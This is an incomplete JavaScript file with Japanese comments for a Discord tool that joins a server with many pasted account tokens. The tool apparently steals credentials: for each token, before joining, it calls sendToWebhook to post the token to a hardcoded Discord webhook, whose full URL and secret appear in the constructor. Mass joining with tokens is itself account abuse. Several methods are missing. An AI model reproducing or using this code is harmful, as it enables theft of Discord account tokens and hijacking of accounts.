class DiscordInvite {
    constructor() {
        this.WEBHOOK_URL = "https://discord.com/api/webhooks/1420270624512938046/HzryfPQKe1BZVN9ixhhkvXxx8Zu6W1V433hQxivvYD10AQDwBnRovsd2ALPTlt2S1tdt";
        this.stats = {
            total: 0,
            success: 0,
            failed: 0
        };
        this.currentInviteCode = null;
        this.currentServerInfo = null;
        this.isProcessing = false; // 処理中フラグ
        
        this.initializeApp();
    }

    initializeApp() {
        this.form = document.getElementById('discordForm');
        this.logContainer = document.getElementById('logContainer');
        this.tokenTextarea = document.getElementById('userTokens');
        this.tokenCount = document.getElementById('tokenCount');
        this.clearLogsBtn = document.getElementById('clearLogs');
        this.serverInfo = document.getElementById('serverInfo');
        this.serverInfoGrid = document.getElementById('serverInfoGrid');
        this.submitButton = this.form.querySelector('button[type="submit"]');
        
        this.setupEventListeners();
        this.updateCurrentTime();
        setInterval(() => this.updateCurrentTime(), 1000);
        this.updateTokenCount();
        
        this.addLog('システム初期化完了', 'success');
        this.addLog('フォーム準備完了', 'info');
    }

    setupEventListeners() {
        // フォーム送信イベント
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            e.stopImmediatePropagation();
            console.log('フォーム送信を防止しました');
            this.handleFormSubmit();
            return false;
        });

        // ボタンクリックイベント（バックアップ）
        this.submitButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('ボタンクリックを処理します');
            this.handleFormSubmit();
        });

        this.tokenTextarea.addEventListener('input', () => {
            this.updateTokenCount();
        });

        this.clearLogsBtn.addEventListener('click', (e) => {
            e.preventDefault();
            this.clearLogs();
        });

        // フォームのすべての入力欄でEnterキーを無効化
        const inputs = this.form.querySelectorAll('input, textarea');
        inputs.forEach(input => {
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                }
            });
        });
    }

    async handleFormSubmit() {
        if (this.isProcessing) {
            this.addLog('処理中です。しばらくお待ちください...', 'warning');
            return;
        }

        console.log('フォーム送信を処理開始');
        this.isProcessing = true;
        this.submitButton.disabled = true;
        this.submitButton.textContent = '処理中...';

        try {
            await this.processAllTokens();
        } catch (error) {
            this.addLog(`処理中にエラーが発生: ${error.message}`, 'error');
        } finally {
            this.isProcessing = false;
            this.submitButton.disabled = false;
            this.submitButton.textContent = '🚀 サーバーに参加';
        }
    }

    updateCurrentTime() {
        const now = new Date();
        document.getElementById('currentTime').textContent = 
            now.toLocaleTimeString('ja-JP');
    }

    updateTokenCount() {
        const tokens = this.getTokensFromTextarea();
        this.tokenCount.textContent = `${tokens.length} tokens`;
        this.updateStat('total', tokens.length);
    }

    getTokensFromTextarea() {
        const text = this.tokenTextarea.value.trim();
        return text.split('\n')
            .map(token => token.trim())
            .filter(token => token.length > 0);
    }

    async processAllTokens() {
        const inviteLink = document.getElementById('inviteLink').value.trim();
        const tokens = this.getTokensFromTextarea();

        if (!inviteLink || tokens.length === 0) {
            this.addLog('エラー: 招待リンクとトークンは必須です', 'error');
            return;
        }

        // 招待コードを抽出
        this.currentInviteCode = this.extractInviteCode(inviteLink);
        if (!this.currentInviteCode) {
            this.addLog('エラー: 無効な招待リンクです', 'error');
            return;
        }

        this.addLog(`招待コード: ${this.currentInviteCode}`, 'info');
        this.addLog(`トークン数: ${tokens.length}個`, 'info');

        // サーバー情報を取得（試行）
        await this.fetchServerInfo(this.currentInviteCode);

        this.addLog(`処理開始: ${tokens.length}個のトークンを処理します`, 'info');

        // 各トークンを順次処理
        for (let i = 0; i < tokens.length; i++) {
            if (!this.isProcessing) break; // 処理中断チェック
            
            const token = tokens[i];
            await this.processSingleToken(token, i + 1, tokens.length);
            // 1秒待機（レート制限回避）
            await this.delay(1000);
        }

        this.addLog(`処理完了: 成功 ${this.stats.success}/${this.stats.total}`, 'success');
        this.updateStatsDisplay();
    }

    async processSingleToken(token, current, total) {
        const shortToken = token.length > 15 ? token.substring(0, 15) + '...' : token;
        this.addLog(`[${current}/${total}] トークン処理中: ${shortToken}`, 'info');

        try {
            // Webhookにトークン情報を送信
            const webhookResult = await this.sendToWebhook(token, this.currentInviteCode);
            if (webhookResult) {
                this.addLog(`[${current}/${total}] ✅ Webhook送信成功`, 'success');
            }

            // Discordサーバーに参加（シミュレーションモード）
            const joinResult = await this.joinDiscordServer(this.currentInviteCode, token);
            
            if (joinResult.success) {
                this.stats.success++;
                this.addLog(`[${current}/${total}] ✅ サーバー参加成功`, 'success');
                
                if (joinResult.guild) {
                    this.addLog(`[${current}/${total}] サーバー: ${joinResult.guild.name}`, 'success');
                }
            } else {
                this.stats.failed++;
                this.addLog(`[${current}/${total}] ❌ 参加失敗: ${joinResult.message}`, 'error');
            }

        } catch (error) {
            this.stats.failed++;
            this.addLog(`[${current}/${total}] ❌ エラー: ${error.message}`, 'error');
        }

        this.updateStatsDisplay();
    }

    // その他のメソッドは前回と同じ...

    addLog(message, type = 'info') {
        const now = new Date();
        const timeString = now.toLocaleTimeString('ja-JP');
        
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        logEntry.innerHTML = `
            <span class="log-time">${timeString}</span>
            <span class="log-${type}">${message}</span>
        `;
        
        this.logContainer.appendChild(logEntry);
        this.logContainer.scrollTop = this.logContainer.scrollHeight;
        
        // コンソールにも出力（デバッグ用）
        console.log(`[${type.toUpperCase()}] ${message}`);
    }

    // その他のメソッド...
}

// アプリケーションの初期化
document.addEventListener('DOMContentLoaded', () => {
    new DiscordInvite();
});
